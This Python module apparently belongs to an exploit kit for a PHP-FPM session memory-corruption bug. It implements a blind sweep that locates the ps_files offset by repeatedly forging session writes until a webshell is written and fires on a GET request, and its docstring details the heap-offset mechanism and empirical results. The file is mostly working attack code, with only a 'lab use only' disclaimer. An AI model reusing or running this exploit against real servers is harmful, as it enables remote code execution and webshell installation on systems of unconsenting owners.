#!/usr/bin/env python3
# INDEX: black-box ps_files locator; residue-page sweep over the EXACT GET-fire file-write signal pins ps_files_choff given a located X and the SAPI sub-page slot | fpm | no gdb/leak, needs X* + a residue window
"""Blind ps_files locator for the K-free session-dangle forge (CVE-2026-109619).

The sibling of blind_anchor_oracle. That oracle locates X = d_choff - carrier_base
(the dangle anchor) while holding ps_files's position KNOWN (folded into RESIDUE =
ps_files_choff - carrier_base). This one locates the OTHER residue -- ps_files itself --
black-box, the last per-build offset the landed K-free var_push write still consumes
from an offline offsets-*.json table.

MECHANISM (not just correlation): the forge's first var_push writes a chunk pointer to
fakee->data[AIM], absolute chunk offset fakee + 0x10 + 8*AIM. With AIM = aim_for(x,
residue) this lands EXACTLY at carrier_base + residue (K and carrier_base cancel). The
two-push ps_files finisher forges last_key@+0 and basedir@+8 and php_session_flush
writes the webshell -- so the file is written, and a plain GET fires it, IFF the write
lands on PS(mod_data), i.e. iff residue == ps_files_choff - carrier_base EXACTLY. Every
other residue steers the push elsewhere in the chunk: a plain GET returns nothing
(file never written). So the GET-fire file-write is an EXACT oracle on ps_files's
position, identical in kind to the X-oracle -- they are two 1-D slices of the one 2-D
exact oracle fire(X, residue), which fires only at (X*, residue*).

RESULT (empirical, php:8.4.26-fpm lab/fpmfire, fresh-container-per-probe, X fixed at the
located X*): a page-stepped residue sweep writes the webshell + GET-fires it (uid=33,
worker survives) at EXACTLY residue* and nowhere else (5-page window, hit only at the
ground-truth page; neighbours miss, one crashed). See verify_blind_psfiles_oracle.py.

Sub-page slot: ps_files_choff's low 12 bits are the per-SAPI PS_OPEN/session-open
high-water (0x208 fpm, 0x1e0 apache -- singleshot_anchor.PS_FILES_BY_SAPI); for a fixed
binary+arm it is stable, so the sweep steps by whole pages at that fixed slot. The PAGE
is what drifts across builds and is what this oracle pins. The slot is EXACT, not
tolerant (empirical: at the true page only 0x208 writes; 0x1f8/0x200 survive without
writing -- the push lands below PS(mod_data) -- and 0x210+ crash on dirdepth/st_size), so
if the slot is unknown it must be SWEPT too, making the sweep 2-D (page x 8-byte slot);
with the slot known the write has no false positives across the residue window.

Residual (honest): the sweep needs a residue WINDOW (a per-build range, or a leak), the
same prior the X-oracle needs -- the cheap narrowing shortcut is refuted there too. And
it consumes a LOCATED X*; standalone from nothing the two axes compose either as a 2-D
(X-window x residue-window) sweep or, if an X-isolating crash/survive signal holds, as
two 1-D sweeps. Pure stdlib, python3 -I safe. Lab/analysis use only, systems you own.
"""
from __future__ import annotations

from primitives.oracles.blind_anchor_oracle import ARM_DELTA, aim_for, forge_carrier  # noqa: F401

PAGE = 0x1000
SUBSLOT_BY_SAPI = {"fpm": 0x208, "apache": 0x1e0}  # ps_files_choff & 0xfff, per SAPI


def residue_for_page(page, subslot):
    """Candidate RESIDUE (= ps_files_choff - carrier_base) for a whole-page guess at the
    fixed per-SAPI sub-page slot. `page` is signed (ps_files sits below carrier_base)."""
    return page * PAGE + subslot


def sweep_psfiles(probe_write, x_star, pages, *, subslot=0x208, center=None):
    """Locate residue* = ps_files_choff - carrier_base by the EXACT GET-fire oracle.
    probe_write(x_star, residue) -> True iff the forge at (x_star, residue) wrote (and a
    GET fires) the webshell. Sweeps candidate ps_files pages at the fixed sub-page slot,
    outward from `center` if given. Returns residue* or None. Each probe is a full
    fresh-worker forge, so keep `pages` as narrow as the prior (leak / per-build range)
    allows."""
    cand = list(pages)
    if center is not None:
        cand.sort(key=lambda p: abs(p - center))
    for pg in cand:
        residue = residue_for_page(pg, subslot)
        try:
            forge_carrier(x_star, residue)   # reject residues whose carrier is out of bounds
        except ValueError:
            continue
        if probe_write(x_star, residue):
            return residue
    return None
